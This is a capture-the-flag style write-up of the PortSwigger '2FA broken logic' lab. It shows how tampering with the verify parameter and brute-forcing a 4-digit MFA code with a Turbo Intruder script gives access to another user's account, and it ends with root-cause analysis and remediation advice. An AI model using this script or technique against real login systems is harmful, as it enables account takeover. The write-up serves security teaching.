# PortSwigger Web Security Academy — 2FA Broken Logic

## Lab: 2FA Broken Logic — MFA Authentication Bypass

**Platform:** PortSwigger Web Security Academy  
**Category:** Authentication → Multi-factor authentication  
**Difficulty:** Practitioner  
**Vulnerability:** Flawed two-factor authentication verification logic  
**Status:** ✅ Solved

🔗 **Official Lab:** https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic

---

## 📌 Lab Description

This lab demonstrates a flaw in the implementation of two-factor authentication (2FA).

The application does not properly bind the MFA verification process to the user who authenticated during the first stage of login. Instead, a client-controlled `verify` parameter can influence which user's MFA process is being verified.

By manipulating this parameter to target `carlos` and then brute-forcing the 4-digit MFA code, it is possible to obtain a successful authentication response and access Carlos's account.

---

## 🎯 Objective

Access **Carlos's account page** despite not knowing his password or MFA code.

The attacker account provided by the lab is:

```text
Username: wiener
Password: peter
```

Target account:

```text
Username: carlos
```

---

## 🔥 Vulnerability

The vulnerability is caused by **broken MFA verification logic**.

The application trusts a client-controlled parameter:

```text
verify=carlos
```

to determine which account's MFA verification is being performed.

A secure application should associate the MFA challenge with the authenticated user using trusted server-side state.

The vulnerability can be summarized as:

```text
Client-controlled identity
          ↓
      MFA logic
          ↓
Verification target can be changed
          ↓
MFA protection can be targeted at another user
```

---

## 🔍 Authentication Flow

The normal authentication process is approximately:

```text
Username + Password
        ↓
Initial authentication
        ↓
MFA verification required
        ↓
POST /login2
        ↓
MFA code verification
        ↓
Authenticated account
```

During request analysis, the MFA request contained:

```text
verify=<username>
mfa-code=<4-digit-code>
```

The presence of a client-controlled identity parameter in an authentication-sensitive request was the key point that led to further investigation.

---

## 🧠 Vulnerability Hypothesis

The important question was:

> Is the MFA challenge actually bound server-side to the user authenticated during the first login stage, or does the server trust the `verify` parameter supplied by the client?

This produced the hypothesis:

```text
If the `verify` parameter can be changed independently,
the application may allow MFA verification for another account.
```

This is the important vulnerability-hunting mindset demonstrated by the lab:

```text
Inspect authentication flow
        ↓
Identify identity-related parameters
        ↓
Determine which values are client-controlled
        ↓
Form a hypothesis
        ↓
Modify the relevant value
        ↓
Observe the server's behavior
```

---

# 🛠️ Exploitation

## 1. Log in with the attacker account

I first authenticated using the credentials supplied by the lab:

```text
Username: wiener
Password: peter
```

The application then required MFA verification.

---

## 2. Intercept the MFA request

Using Burp Suite, I intercepted the request sent to:

```http
POST /login2
```

The request contained the MFA code and a `verify` parameter.

Conceptually:

```http
POST /login2 HTTP/1.1
Host: <LAB-HOST>
Cookie: session=<REDACTED>

Content-Type: application/x-www-form-urlencoded

verify=<username>&mfa-code=<4-digit-code>
```

---

## 3. Change the verification target

The `verify` parameter was changed to:

```text
verify=carlos
```

This caused the application to process the MFA stage in the context of Carlos.

The important observation was that the client could influence the identity associated with the MFA verification process.

---

## 4. Identify the MFA brute-force point

The MFA code was four digits.

Therefore, the complete search space was:

```text
0000 → 9999
```

Total possible codes:

```text
10,000
```

The MFA request was sent to Turbo Intruder with the code replaced by a payload marker:

```text
mfa-code=%s
```

---

# 🚀 Turbo Intruder Attack

The attack was automated using Turbo Intruder.

The final script used for the brute-force attack was:

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=1,
        engine=Engine.BURP,
        maxRetriesPerRequest=0,
        timeout=30
    )

    for i in range(10000):
        engine.queue(target.req, '%04d' % i)


def handleResponse(req, interesting):

    if req.status == 302:
        table.add(req)
```

### Why `%04d`?

The `%04d` format ensures that the numbers remain four digits:

```text
0    → 0000
1    → 0001
42   → 0042
402  → 0402
1323 → 1323
```

This is necessary because the MFA code consists of exactly four digits.

---

# ⚙️ Turbo Intruder Configuration

The initial configuration produced a large number of failed/retried requests.

The attack was therefore reduced to a conservative configuration:

```text
Concurrent connections: 1
Requests per connection: 1
Retries: 0
Timeout: 30 seconds
```

This prioritized reliable request delivery over maximum request rate.

The attack was then allowed to iterate through the MFA code space.

---

# 📊 Response Analysis

Most incorrect MFA codes produced:

```text
HTTP/1.1 200 OK
```

The successful MFA code produced:

```text
HTTP/1.1 302 Found
```

Therefore, the `302` status became the success condition.

The Turbo Intruder response handler filtered for it:

```python
if req.status == 302:
    table.add(req)
```

This allowed the successful request to be identified without displaying every normal response.

---

# 🎯 Successful Request

After the brute-force attack reached the correct MFA code, a request returned:

```text
302 Found
```

This indicated that the MFA verification had succeeded.

The important distinction is:

```text
200 → Normal/incorrect MFA attempt
302 → Successful authentication flow
```

The exact session values and authentication tokens are intentionally omitted from this write-up.

---

# 🌐 Open Response in Browser

After identifying the successful `302` response, the Turbo Intruder attack was halted.

The successful response was then opened using Burp Suite's:

```text
Open response in browser
```

feature.

This is a **Burp Suite workflow feature, not the vulnerability itself**.

Its purpose is to take the captured HTTP response and allow Burp's browser to process it.

Conceptually:

```text
Turbo Intruder
      ↓
Captured successful 302
      ↓
Open response in browser
      ↓
Burp-generated browser URL
      ↓
Browser processes the captured response
      ↓
302 redirect is followed
      ↓
/my-account
```

The vulnerability had already been exploited before this step.

---

# 🏆 Lab Completion

The successful `302` response was opened in Burp's browser.

The browser followed the redirect and the account page became accessible.

Selecting:

```text
My account
```

resulted in the PortSwigger lab being marked:

```text
SOLVED
```

---

# 🔬 Root Cause

The root cause is insufficient server-side binding between:

```text
Authenticated user
        ↕
MFA challenge
        ↕
MFA verification
```

A secure implementation should maintain this relationship on the server.

For example:

```text
Challenge ID: ABC123
       ↓
Server-side record
       ↓
User ID: Carlos
       ↓
Expiration: 2 minutes
       ↓
Attempt limit
```

The client should not be able to redefine the user associated with the MFA challenge by changing a request parameter.

---

# ❌ Vulnerable Design

Conceptually, the vulnerable flow behaves like:

```text
Client
  |
  | verify=carlos
  | mfa-code=XXXX
  ↓
Server
  |
  | "Verify Carlos"
  ↓
MFA verification
```

The client is influencing the identity being verified.

---

# ✅ Secure Design

A more secure design would look like:

```text
Initial authentication
        ↓
Server authenticates user
        ↓
Server creates MFA challenge
        ↓
Challenge ID stored server-side
        ↓
Challenge ID → authenticated user
        ↓
Client submits MFA code
        ↓
Server looks up challenge
        ↓
Server determines associated user
        ↓
MFA verification
```

The server, rather than the client, determines which account the MFA challenge belongs to.

---

# 💡 Why the Attack Worked

Two weaknesses combined in this lab:

### 1. Broken MFA identity binding

The `verify` parameter allowed the MFA verification target to be influenced by the client.

```text
verify=carlos
```

### 2. Small MFA search space

The MFA code contained only four digits:

```text
0000–9999
```

Therefore:

```text
10^4 = 10,000 possible codes
```

When the application allowed repeated attempts, the code could be searched automatically.

Together:

```text
Broken MFA binding
        +
Weak brute-force protection
        ↓
MFA authentication bypass
```

---

# 🧪 Vulnerability-Hunting Methodology

The most important lesson from this lab was not the brute-force payload.

The methodology was:

```text
1. Map the authentication flow
        ↓
2. Intercept the requests
        ↓
3. Identify identity-related parameters
        ↓
4. Determine which values are client-controlled
        ↓
5. Ask whether authentication state is
   bound server-side
        ↓
6. Form a vulnerability hypothesis
        ↓
7. Modify one relevant parameter
        ↓
8. Compare server behavior
        ↓
9. Automate the confirmed attack
        ↓
10. Identify a reliable success condition
```

The key mindset:

> **Don't begin with "What payload should I send?" Begin with "What does the server believe about my identity at this point in the authentication process?"**

---

# 🛡️ Recommended Remediation

## 1. Bind MFA challenges server-side

Associate each MFA challenge with the authenticated user:

```text
challenge_id → user_id
```

The client should not be able to modify this relationship.

---

## 2. Do not trust client-controlled identity during MFA

Parameters such as:

```text
verify=
username=
user=
account=
email=
```

should not be treated as the authoritative source of authentication identity.

The identity should come from trusted server-side authentication state.

---

## 3. Implement server-side MFA attempt limits

Controls should include appropriate protections against repeated guesses, such as:

- Maximum MFA verification attempts
- Progressive delays
- Temporary challenge invalidation
- Appropriate throttling
- Secure account recovery procedures

The protection must actually be enforced server-side.

---

## 4. Expire MFA challenges

MFA challenges should have a short lifetime.

Example:

```text
Challenge created
      ↓
Short expiration period
      ↓
Challenge becomes invalid
```

---

## 5. Make MFA codes single-use

Once successfully verified, an MFA code should not remain valid for another authentication attempt.

---

## 6. Monitor authentication anomalies

Security monitoring should correlate multiple signals rather than relying exclusively on IP addresses.

Useful signals can include:

```text
Account
Session
MFA challenge
Device
Network
Authentication failures
Authentication successes
Request patterns
Timing
```

---

# 🌎 Real-World Impact

A similar vulnerability in a production application could potentially allow an attacker to bypass an MFA control and gain unauthorized access to another user's account.

Potential impact includes:

- Account takeover
- Unauthorized access to user data
- Access to privileged functionality
- Compromise of administrative accounts
- Circumvention of MFA as an authentication control

The actual severity would depend on the application's architecture, privileges, and additional security controls.

---

# 📚 Key Takeaways

### 1. MFA is not automatically secure

Implementing an MFA screen does not guarantee that MFA is correctly enforced.

The entire authentication state machine must be secure.

### 2. Authentication state must be bound to the correct user

The server should know:

```text
"This MFA challenge belongs to this user."
```

without allowing the client to redefine that relationship.

### 3. Client-controlled identity parameters deserve investigation

Seeing something like:

```text
verify=carlos
```

inside an authentication request does not automatically prove a vulnerability.

It is a **clue** that should lead to a hypothesis and controlled testing.

### 4. Status-code differences can provide a useful oracle

In this lab:

```text
Incorrect MFA → 200
Correct MFA   → 302
```

The difference provided a reliable success condition for automation.

### 5. Understand before automating

Turbo Intruder made the 4-digit search practical, but the important discovery came from analyzing the authentication flow first.

```text
Inspect
  ↓
Hypothesize
  ↓
Test
  ↓
Confirm
  ↓
Automate
```

### 6. Burp's "Open response in browser" is not the vulnerability

It simply allowed the already-captured successful response to be processed by the browser.

The actual vulnerability was the application's flawed MFA verification logic.

---

# 🧰 Tools Used

- Burp Suite
- Burp Proxy
- Burp Repeater
- Turbo Intruder
- Burp Browser

---

# 🧠 Skills Practiced

- Authentication testing
- MFA/2FA security testing
- HTTP request/response analysis
- Burp Suite
- Turbo Intruder
- Parameter manipulation
- Authentication state analysis
- Business logic testing
- MFA challenge binding analysis
- Brute-force testing
- Response-based success detection
- Server-side session analysis
- Vulnerability hypothesis development

---

# 📖 References

### PortSwigger

- [2FA broken logic — Official Lab](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
- [Multi-factor authentication vulnerabilities](https://portswigger.net/web-security/authentication/multi-factor)
- [Authentication vulnerabilities](https://portswigger.net/web-security/authentication)
- [Burp Intruder results](https://portswigger.net/burp/documentation/desktop/tools/intruder/results)
- [Burp Intruder result workflow](https://portswigger.net/burp/documentation/desktop/tools/intruder/results/workflow)
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)

### OWASP

- [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

---

# ✅ Lab Completion Checklist

```text
[✓] Logged in with attacker account
[✓] Intercepted MFA request
[✓] Identified `verify` parameter
[✓] Changed verification target to Carlos
[✓] Identified 4-digit MFA code
[✓] Prepared Turbo Intruder attack
[✓] Resolved initial request failures
[✓] Brute-forced MFA code
[✓] Identified successful 302 response
[✓] Halted the attack
[✓] Opened successful response in browser
[✓] Accessed My account
[✓] Lab marked as SOLVED
```

---

## 🏁 Final Result

**PortSwigger Web Security Academy — 2FA Broken Logic**

**Status: ✅ SOLVED**

The lab demonstrated how improper server-side binding of an MFA challenge to the authenticated user, combined with insufficient protection against repeated MFA guesses, can undermine a multi-factor authentication implementation.
